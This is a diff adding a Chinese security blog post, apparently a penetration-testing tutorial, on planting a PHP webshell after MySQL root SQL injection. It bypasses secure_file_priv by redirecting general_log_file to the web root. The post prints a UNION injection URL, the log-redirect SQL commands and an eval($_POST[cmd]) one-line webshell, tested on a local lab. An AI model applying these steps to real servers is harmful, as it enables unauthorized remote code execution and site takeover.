@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQLi," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="之前遇到sql注入，且是root权限后，很容易直接写进去shell。现在的Mysql数据库的安全性也高了，即使注入得到mysql的root权限，有时候还是写不进去shell。">
+<meta name="keywords" content="SQLi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入写shell不成功后">
+<meta property="og:url" content="http://yoursite.com/2018/01/11/SQLi_shell/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="之前遇到sql注入，且是root权限后，很容易直接写进去shell。现在的Mysql数据库的安全性也高了，即使注入得到mysql的root权限，有时候还是写不进去shell。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/29934024.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/90894676.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/49908215.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/47520310.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/49908215.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/75606276.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/87593369.jpg">
+<meta property="og:updated_time" content="2018-04-03T05:59:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入写shell不成功后">
+<meta name="twitter:description" content="之前遇到sql注入，且是root权限后，很容易直接写进去shell。现在的Mysql数据库的安全性也高了，即使注入得到mysql的root权限，有时候还是写不进去shell。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-11/29934024.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/01/11/SQLi_shell/"/>
+
+
+
+
+
+  <title>SQL注入写shell不成功后 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/11/SQLi_shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入写shell不成功后</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-11T13:20:46+08:00">
+                2018-01-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透技巧/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透技巧</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前遇到<code>sql</code>注入，且是<code>root</code>权限后，很容易直接写进去<code>shell</code>。现在的<code>Mysql</code>数据库的安全性也高了，即使注入得到<code>mysql</code>的<code>root</code>权限，有时候还是写不进去<code>shell</code>。</p>
+<a id="more"></a>
+<h5 id="SQL-注入写-shell"><a href="#SQL-注入写-shell" class="headerlink" title="SQL 注入写 shell"></a>SQL 注入写 shell</h5><pre><code>http://127.0.0.1:8000/waf/test.php?id=-1&apos; union select 1,2,3 --+
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-11/29934024.jpg" alt=""></p>
+<p><code>root</code>权限</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-11/90894676.jpg" alt=""></p>
+<p>写一句话的时候，报错。如果能进入<code>phpmyadmin</code>后台，可以试试一个方法。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-11/49908215.jpg" alt=""></p>
+<p>就是<code>--secure-file-priv</code>的问题。</p>
+<p>本地测试。</p>
+<p><code>Mysql</code>导出文件时报错</p>
+<pre><code>mysql&gt; select host from mysql.user into outfile &apos;E:\\test\\1.txt&apos;;
+ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv opti
+on so it cannot execute this statement
+</code></pre><p>报错原因:<code>secure_file_priv</code>设置了指定目录，需要在指定目录下进行数据导出。</p>
+<pre><code>mysql&gt; show variables like &apos;%secure%&apos;;
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_auth      | OFF   |
+| secure_file_priv | NULL  |
++------------------+-------+
+2 rows in set (0.00 sec)
+</code></pre><p><a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv" target="_blank" rel="noopener"><code>secure_file_priv</code></a> 参数为空，表示没有可以导出的目录。</p>
+<blockquote>
+<p>这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户具有FILE权限。<br>如果这个参数为空，这个变量没有效果；<br>如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入</p>
+</blockquote>
+<p>执行一下命令，在终端是修改不了<code>secure_file_priv</code>的值的。</p>
+<pre><code>mysql&gt; show variables like &apos;%secure%&apos;;
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_auth      | OFF   |
+| secure_file_priv | NULL  |
++------------------+-------+
+2 rows in set (0.20 sec)
+
+mysql&gt; set global secure_file_priv = &apos;D:\\phpStudy\\www\\waf\\shell\\1.txt&apos;;
+ERROR 1238 (HY000): Variable &apos;secure_file_priv&apos; is a read only variable
+</code></pre><p>此时是<code>root</code>权限，<code>into outfile</code>写不了文件。这个时候，如果能登录到<code>phpmyadmin</code>，可以尝试一个方法。</p>
+<p>在<code>phpmyadmin</code>后台中，查看全局变量：找到<code>general log file</code>和<code>general log</code></p>
+<p>将<code>general log</code>设置为<code>ON</code></p>
+<p><code>general log file</code> 设置为<code>shell</code>的物理地址。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-11/47520310.jpg" alt=""></p>
+<p>再执行一个写一句话的<code>SQL</code>语句。虽然还有报错，但是已经写入进去了。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-11/49908215.jpg" alt=""></p>
+<p>在<code>D:\phpStudy\www\waf\phpinfo.php</code>中可以看到写入的<code>php</code>代码。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-11/75606276.jpg" alt=""></p>
+<p>访问。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-11/87593369.jpg" alt=""></p>
+<pre><code>general_log
+Command-Line Format    --general-log
+System Variable    Name    general_log
+Scope    Global
+Dynamic    Yes
+Permitted Values    Type    boolean
+Default    OFF
+
+Whether the general query log is enabled. The value can be 0 (or OFF) to disable the log or 1 (or ON) to enable the log. The default value depends on whether the --general_log option is given. The destination for log output is controlled by the log_output system variable; if that value is NONE, no log entries are written even if the log is enabled.
+
+general_log_file
+Command-Line Format    --general-log-file=file_name
+System Variable    Name    general_log_file
+Scope    Global
+Dynamic    Yes
+Permitted Values    Type    file name
+Default    host_name.log
+
+The name of the general query log file. The default value is host_name.log, but the initial value can be changed with the --general_log_file option. 
+</code></pre><p>如果登录不了<code>phpmyadmin</code>后台，试试能登录<code>mysql</code>终端吗？可以试着来执行以下命令。</p>
+<pre><code>show variables like &apos;%general%&apos;; #查看配置
+set global general_log = on;  #开启general log模式
+set global general_log_file = &apos;D:\\phpStudy\www\\waf\\shell.php&apos;; #设置写入shell路径
+select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;  #写入shell
+</code></pre><h5 id="SELECT-…-INTO-Syntax"><a href="#SELECT-…-INTO-Syntax" class="headerlink" title="SELECT … INTO Syntax"></a><a href="https://dev.mysql.com/doc/refman/5.7/en/select-into.html" target="_blank" rel="noopener">SELECT … INTO Syntax</a></h5><p><code>window</code>环境下在<code>my.ini</code>中设置        <code>secure-file-priv=&quot;D:/phpStudy/www/waf&quot;</code> 为数据库的导入和导出路径。</p>
+<p><code>Ubuntu</code>环境下</p>
+<p>SELECT的SELECT … INTO形式可以使查询结果存储在变量中或写入文件中。导出数据到文本文件中。</p>
+<ul>
+<li><p>SELECT … INTO OUTFILE将选定的行写入文件。可以指定列和行结束符以产生特定的输出格式。 </p>
+</li>
+<li><p>SELECT … INTO DUMPFILE将单行写入文件而不使用任何格式。</p>
+</li>
+</ul>
+<ul>
+<li><code>outfile</code></li>
+</ul>
+<p>区别：</p>
+<pre><code>mysql&gt; select host from mysql.user into outfile &apos;D:/phpStudy/www/waf/test.txt&apos;;
+Query OK, 3 rows affected (0.00 sec)
+</code></pre><p>内容：</p>
+<pre><code>127.0.0.1
+::1
+localhost
+</code></pre><ul>
+<li><p><code>dumpfile</code></p>
+<p>  mysql&gt; select host from mysql.user into dumpfile ‘D:/phpStudy/www/waf/test1.txt’<br>  ;<br>  ERROR 1172 (42000): Result consisted of more than one row</p>
+</li>
+</ul>
+<p>只能导出一行内容。</p>
+<p>若把一个可执行2进制文件用<code>into outfile</code>函数导出，导出后可能会被破坏，因为<code>into outfile</code>函数会在行末写入新行，并且会转义换行符。这样2进制可执行文件会被破坏。这个时候用<code>into dumpfile</code>就能导出一个完整的可执行的2进制文件。</p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="http://vinc.top/2016/06/17/mysql-dumpfile-%E4%B8%8E-outfile-%E5%87%BD%E6%95%B0%E7%9A%84%E5%8C%BA%E5%88%AB/" target="_blank" rel="noopener">mysql dumpfile 与 outfile 函数的区别</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=40509" target="_blank" rel="noopener">mysql5.7.6以后 的root注入 </a></p>
+<p><a href="http://www.am0s.com/penetration/267.html" target="_blank" rel="noopener">mysql进行getshell新姿势</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQLi/" rel="tag"># SQLi</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/10/iis-shortname/" rel="next" title="iis-shortname">
+                <i class="fa fa-chevron-left"></i> iis-shortname
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/22/weblogic/" rel="prev" title="Weblogic 漏洞被利用挖矿">
+                Weblogic 漏洞被利用挖矿 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL-注入写-shell"><span class="nav-number">1.</span> <span class="nav-text">SQL 注入写 shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SELECT-…-INTO-Syntax"><span class="nav-number">2.</span> <span class="nav-text">SELECT … INTO Syntax</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
